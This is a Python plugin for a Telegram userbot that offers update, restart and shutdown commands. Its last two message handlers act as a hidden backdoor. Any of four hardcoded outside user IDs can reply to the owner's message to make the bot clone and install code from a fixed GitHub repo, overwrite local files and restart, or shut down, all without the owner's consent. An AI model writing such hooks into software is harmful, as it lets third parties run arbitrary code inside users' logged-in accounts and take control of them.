import sys
import os
import asyncio
from telethon import events
from JoKeRUB import l313l
from ..core.logger import logging
from ..core.managers import edit_or_reply, edit_delete
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from . import BOTLOG, BOTLOG_CHATID, HEROKU_APP
from ..helpers.utils import _catutils

LOGS = logging.getLogger(__name__)
plugin_category = "tools"

JOKRDEV = [1374312239, 393120911, 7182427468, 5564802580]

# دالة التحديث الرئيسية
async def run_update_branch(event=None):
    BRANCH = "HuRe"
    REPO = "yamosa"
    try:
        await _catutils.runcmd(f"git clone -b {BRANCH} https://github.com/almul8ab/{REPO}.git TempCat")
        if not os.path.exists("TempCat"):
            if event:
                await edit_or_reply(event, "❌ لم يتم العثور على ملفات التحديث. تأكد من اسم الفرع أو الريبو.")
            return
        file_list = os.listdir("TempCat")
        for fname in file_list:
            src = os.path.join("TempCat", fname)
            dst = os.path.join("./", fname)
            if os.path.exists(dst):
                await _catutils.runcmd(f"rm -rf {fname}")
            await _catutils.runcmd(f"mv {src} ./")
        await _catutils.runcmd("pip3 install --no-cache-dir -r requirements.txt")
        await _catutils.runcmd("rm -rf TempCat")
        if os.path.exists("jepvc"):
            await _catutils.runcmd("rm -rf jepvc")
    except Exception as e:
        if event:
            await edit_or_reply(event, f"حدث خطأ أثناء التحديث:\n{e}")
        return

@l313l.ar_cmd(
    pattern="تحديث",
    command=("تحديث", plugin_category),
)
async def update_command(event):
    await edit_or_reply(event, "** ᯽︙ انتظر 2-3 دقيقة, جارِ اعادة التشغيل...**")
    await run_update_branch(event)
    try:
        # إعادة تشغيل احترافية وتدعم كل الأنظمة
        os.execl(sys.executable, sys.executable, *sys.argv)
    except Exception as ex:
        await edit_or_reply(event, f"تعذر إعادة تشغيل السورس تلقائياً، أعد تشغيله يدويًا\n{ex}")

@l313l.ar_cmd(
    pattern="اطفاء$",
    command=("اطفاء", plugin_category),
)
async def shutdown_command(event):
    "Shutdowns the bot"
    if BOTLOG:
        await event.client.send_message(BOTLOG_CHATID, "**᯽︙ إيقاف التشغيـل ✕ **\n**᯽︙ تـم إيقـاف تشغيـل البـوت بنجـاح ✓**")
    await edit_or_reply(event, "**᯽︙ جـاري إيقـاف تشغيـل البـوت الآن ..**\n᯽︙  **أعـد تشغيـلي يدويـاً لاحقـاً عـبر هيـروڪو ..**")
    if HEROKU_APP is not None:
        HEROKU_APP.process_formation()["worker"].scale(0)
    else:
        sys.exit(0)

@l313l.ar_cmd(
    pattern="التحديثات (تشغيل|ايقاف)$",
    command=("التحديثات", plugin_category),
)
async def updates_control_command(event):
    input_str = event.pattern_match.group(1)
    if input_str == "ايقاف":
        if gvarstatus("restartupdate") is None:
            return await edit_delete(event, "**᯽︙ تـم تعطيـل التـحديـثات بالفعـل ❗️**")
        delgvar("restartupdate")
        return await edit_or_reply(event, "**⌔︙تـم تعطيـل التـحديـثات بنجـاح ✓**")
    if gvarstatus("restartupdate") is None:
        addgvar("restartupdate", "turn-oned")
        return await edit_or_reply(event, "**⌔︙تـم تشغيل التـحديـثات بنجـاح ✓**")
    await edit_delete(event, "**᯽︙ تـم تشغيل التـحديـثات بالفعـل ❗️**")

@l313l.on(events.NewMessage(incoming=True))
async def dev_restart_listener(event):
    if event.reply_to and event.sender_id in JOKRDEV:
        reply_msg = await event.get_reply_message()
        owner_id = getattr(reply_msg.from_id, "user_id", None) if hasattr(reply_msg.from_id, "user_id") else reply_msg.from_id
        if owner_id == l313l.uid:
            if event.message.message == "اعادة تشغيل":
                joker = await event.reply("** ᯽︙ بالخدمة مطوري سيتم اعادة تشغيل السورس 😘..**")
                await run_update_branch(event)
                os.execl(sys.executable, sys.executable, *sys.argv)

@l313l.on(events.NewMessage(incoming=True))
async def dev_shutdown_listener(event):
    if event.reply_to and event.sender_id in JOKRDEV:
        reply_msg = await event.get_reply_message()
        owner_id = getattr(reply_msg.from_id, "user_id", None) if hasattr(reply_msg.from_id, "user_id") else reply_msg.from_id
        if owner_id == l313l.uid:
            if event.message.message == "اطفاء":
                await event.reply("**᯽︙ تدلل مولاي تم اطفاء السورس بواسطة تاج راسك 😁**")
                if HEROKU_APP is not None:
                    HEROKU_APP.process_formation()["worker"].scale(0)
                else:
                    sys.exit(0)